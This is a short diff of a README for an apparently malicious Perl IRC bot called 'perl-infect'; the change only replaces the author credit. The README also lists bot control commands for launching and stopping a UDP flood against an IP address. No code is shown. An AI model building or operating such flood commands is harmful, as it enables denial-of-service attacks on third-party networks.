@@ -1,6 +1,5 @@
 # perl-infect
-perl infect for irc net's, made by @1nocent
-
+perl infect for irc net's, powered by inocentinho @ pryzraky
 layer4 commands:
 
 !udp ip | !stopudp 
